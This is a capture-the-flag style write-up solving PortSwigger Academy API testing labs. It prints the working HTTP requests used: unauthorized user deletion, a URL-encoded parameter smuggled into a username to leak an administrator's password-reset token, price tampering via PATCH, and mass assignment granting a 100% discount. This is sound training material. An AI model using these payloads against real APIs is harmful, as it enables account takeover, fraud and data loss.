
# Lab 1

## Description

To solve the lab, find the exposed API documentation and delete `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.

#### Required knowledge

To solve this lab, you'll need to know:

- What API documentation is.
- How API documentation may be useful to an attacker.
- How to discover API documentation.

These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.

## Solution

When changing mail address of user `wiener` and looking in HTTP request history a PATCH request does appear. Changing PATCH to DELETE and changing `wiener` to `carlos` :

```
DELETE /api/user/carlos
```

Deletes the user `carlos` and solve the challenge.


# Lab 2

## Description

To solve the lab, log in as the `administrator` and delete `carlos`.

#### Required knowledge

To solve this lab, you'll need to know:

- How to use URL query syntax to attempt to change a server-side request.
- How to use error messages to build an understanding of how a server-side API processes user input.

These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.

## Solution

Trying password reset on `administrator` with:

```
POST /forgot-password HTTP/2
[...]

csrf=GVOwxjavtTDOiPdxhQtAOjm1MnR4izYQ&username=administrator
```

shows:

```
{"type":"email","result":"*****@normal-user.net"}
```

trying:

```
POST /forgot-password HTTP/2
[...]

csrf=GVOwxjavtTDOiPdxhQtAOjm1MnR4izYQ&username=administrator#
```

returns:

```
{"error": "Field not specified."}
```

Now adding `field` as a parameter:

```
csrf=GVOwxjavtTDOiPdxhQtAOjm1MnR4izYQ&username=administrator%26field%3dc%23
```

**NOTE:** If `&` isn't URL encoded it doesn't work!

returns:

```
{"type":"ClientError","code":400,"error":"Invalid field."}
```

Which means `field` is a valid parameter field. Looking at `/static/js/forgotPassword.js` shows:

```
[...]
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

Now trying:

```
csrf=GVOwxjavtTDOiPdxhQtAOjm1MnR4izYQ&username=administrator%26field=reset_token%23
```

returns:

```
{"type":"reset_token","result":"dicq5clknk631onqe6jidh4ouen8wvg8"}
```

Using that token with:

```
GET /forgot-password?reset_token=fs4y5eizbtqz5kvn3tdv9j5ebkeqahv0
```

redirects to a password reset page. Setting a password, logging in as `administrator` then heading to `admin panel` provides the possibility to delete user `carlos` and solves the lab.


# Lab 3

## Description

To solve the lab, exploit a hidden API endpoint to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

#### Required knowledge

To solve this lab, you'll need to know:

- How to use error messages to construct a valid request.
- How HTTP methods are used by RESTful APIs.
- How changing the HTTP method can reveal additional functionality.

These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.

## Solution

False lead on `/cart` POST request which looked promising. Instead look at this:

```
GET /api/products/1/price
```

change to:

```
OPTION /api/products/1/price
```

to see which methods are allowed:

```
[...]
Allow: GET, PATCH
[...]
```

Trying `PATCH` returns:

```
{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```

Right click on request and change `body encoding` to `JSON`. Then add `{}` for empty body, add `Content-Type: application/json` and resend which returns:

```
{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
```

adding `price` like this:

```
PATCH /api/products/1/price HTTP/2
[...]
{
"price":"rers"
}
```

returns:

```
{"type":"ClientError","code":400,"error":"'price' parameter must be a valid non-negative integer"}
```

Trying further:

```
PATCH /api/products/1/price HTTP/2
[...]
{
"price":0
}
```

returns:

```
{"price":"$0.00"}
```

Heading to product listing on web page displays the jacket as costing `$0.00`.  Adding to cart and buying the jacket for `$0.00` solves the lab.


# Lab 4

## Description

To solve the lab, find and exploit a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

#### Required knowledge

To solve this lab, you'll need to know:

- What mass assignment is.
- Why mass assignment may result in hidden parameters.
- How to identify hidden parameters.
- How to exploit mass assignment vulnerabilities.

These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.
## Solution

Going through the process of buying the jacket from the browser (until it says insufficient funds), then looking at request history shows:

```
GET /api/checkout
```

Which returns:

```
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

Using the same methodology as before, swapping `GET` for `OPTIONS` shows:

```
Allow: POST, GET
```

Changing request method to `POST` and sending:

```
POST /api/checkout HTTP/2
[...]
{"test":1}
```

returns:

```
{"error":"Key order: Key chosen_products: undefined is not an array"}
```

Now using the original `GET` request as guide to populate the `POST` request and sending:

```
{"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

returns as expected:

```
HTTP/2 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS
```

Changing `item_price` to `0` returns:

```
HTTP/2 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS
```

Still not working. Forgot about `"chosen_discount":{"percentage":0}`...

Adding it to the existing payload (while restoring the item price):

```
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```

returns:

```
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
```

Which solves the lab.


# Lab 5

## Description

To solve the lab, log in as the `administrator` and delete `carlos`.

#### Required knowledge

To solve this lab, you'll need to know:

- How to identify whether a user input is included in a server-side URL path or query string.
- How to use path traversal sequences to attempt to change a server-side request.
- How to discover API documentation.

These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.


## Solution

Needs more research -> combines path traversal with previous API lab techniques.